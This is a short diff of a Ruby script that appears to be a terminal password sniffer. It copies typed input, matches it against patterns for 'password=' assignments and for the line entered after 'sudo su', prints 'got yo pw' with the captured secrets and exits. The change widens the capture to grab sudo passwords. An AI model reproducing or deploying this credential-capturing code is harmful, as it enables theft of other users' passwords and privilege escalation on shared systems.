@@ -22,11 +22,11 @@ begin
     f = ''
     io_copy(STDIN, w) do |data|
       f << data
-      if f =~ /(pass|password|pw)\s*=\s*(\S+)\s|(sudo)\s*\n([^\n]+\n)/
+      if f =~ /(pass|password|pw)\s*=\s*(\S+)\s|(sudo su).*\r([^\r]+\r)/
         `stty #{STATE}`
         puts ''
         puts "got yo pw"
-        puts $2
+        puts [$2, $4].compact
         exit(12)
       end
     end
